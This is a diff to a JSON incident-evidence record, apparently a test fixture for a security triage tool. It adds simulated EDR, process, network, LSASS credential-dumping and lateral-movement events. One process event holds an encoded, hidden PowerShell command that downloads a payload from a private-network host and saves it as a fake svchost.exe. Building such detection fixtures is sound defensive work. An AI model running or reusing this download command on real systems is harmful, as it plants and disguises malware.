@@ -60,30 +60,90 @@
       "evidence_id": "ev-d7b730986af5a14c5d2575759dc83b8932a1276f5ba05a12cc717b247410e3eb",
       "hash": "794e31dac2f14f5df1c802dd9bbf57dd56bdbba75e301bb972b2c3609d72e45d",
       "ingested_at": "2026-05-02T09:14:22Z",
+      "raw_content": {
+        "alert_id": "alert-20260502-001",
+        "alert_type": "edr_alert",
+        "child_process": "powershell.exe",
+        "description": "Suspicious child process spawned by Office application",
+        "host": "HOST-12",
+        "host_fqdn": "HOST-12.corp.example",
+        "severity": "high",
+        "source_process": "winword.exe",
+        "timestamp": "2026-05-02T09:14:00Z"
+      },
       "source_type": "edr_alert"
     },
     {
       "evidence_id": "ev-7c755e0085c1365255d70796c78f1ba27138aa47df7d629ee324cdf3ac34bd01",
       "hash": "c65c0ef3f6dad53569a930b7260d503f146f89656759d76472c8875d4bac4f0d",
       "ingested_at": "2026-05-02T09:14:22Z",
+      "raw_content": {
+        "event_id": "pe-001",
+        "event_type": "process_event",
+        "parent_pid": 3104,
+        "parent_process": "winword.exe",
+        "pid": 7832,
+        "process_name": "powershell.exe",
+        "command_line": "powershell.exe -WindowStyle Hidden -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAwADAALwBwAGEAeQBsAG8AYQBkACcALAAnAEMAOgBcAFQAZQBtAHAAXABzAHYAYwBoAG8AcwB0AC4AZQB4AGUAJwApAA==",
+        "timestamp": "2026-05-02T09:14:03Z",
+        "user": "CORP\\jsmith"
+      },
       "source_type": "process_event"
     },
     {
       "evidence_id": "ev-ec12be18dc1bb56096f56e944d55fea59251f5c9f251d2344ca0b3da98858d5a",
       "hash": "4e7cdb5bdc70c7b9da486f935a9f361c2d930a20a4721a068ff7ddf4a815ed63",
       "ingested_at": "2026-05-02T09:14:22Z",
+      "raw_content": {
+        "bytes_received": 98304,
+        "bytes_sent": 1842,
+        "classification": "external_c2_candidate",
+        "destination_ip": "203.0.113.50",
+        "destination_port": 443,
+        "event_id": "ne-001",
+        "event_type": "network_event",
+        "pid": 7832,
+        "process": "powershell.exe",
+        "protocol": "HTTPS",
+        "source_host": "HOST-12",
+        "timestamp": "2026-05-02T09:14:07Z"
+      },
       "source_type": "network_event"
     },
     {
       "evidence_id": "ev-b6d04ab6ccf177c7d8559bb3875950cb86daa7d701f4206d4c68d0a337e0053c",
       "hash": "f4a832d60d5598ed46ac4b72cc8f69ed2a030373ddfbaafd4ebbde8d9043c224",
       "ingested_at": "2026-05-02T09:14:22Z",
+      "raw_content": {
+        "event_id": "ca-001",
+        "event_type": "credential_access",
+        "host": "HOST-12",
+        "pid": 7832,
+        "process": "powershell.exe",
+        "target_process": "lsass.exe",
+        "technique": "T1003.001",
+        "technique_name": "OS Credential Dumping: LSASS Memory",
+        "timestamp": "2026-05-02T09:14:11Z"
+      },
       "source_type": "credential_access"
     },
     {
       "evidence_id": "ev-a4791665e335c31708b308bd79f11d6f4e266d1eeff828f9ee9a84e69b3a8fb5",
       "hash": "a825d1974ff6e43f372428db972c99a27d86c3fd1222708b1395e791999a127d",
       "ingested_at": "2026-05-02T09:14:22Z",
+      "raw_content": {
+        "destination_host": "HOST-13",
+        "destination_ip": "10.0.1.13",
+        "event_id": "lm-001",
+        "event_type": "lateral_movement_attempt",
+        "pid": 7832,
+        "process": "powershell.exe",
+        "source_host": "HOST-12",
+        "status": "blocked_by_firewall",
+        "technique": "T1021.002",
+        "technique_name": "Remote Services: SMB/Windows Admin Shares",
+        "timestamp": "2026-05-02T09:14:19Z"
+      },
       "source_type": "lateral_movement_attempt"
     }
   ],
@@ -231,7 +291,7 @@
     "highest_severity_finding": "critical (credential_access via LSASS)",
     "model_contribution": false,
     "set_at": "2026-05-02T09:14:23Z",
-    "signing_tag": "sig-cd57e7269f949ad8dc7c230858a12d340f9e1a82f5a74f12409bc5e06ce3b2b8",
+    "signing_tag": "sig-04bf0a470d1c7d0641892dc20b88c57ab32371fd0bba39426c3366dbcc41b1b9",
     "value": "confirmed_malicious"
   }
 }
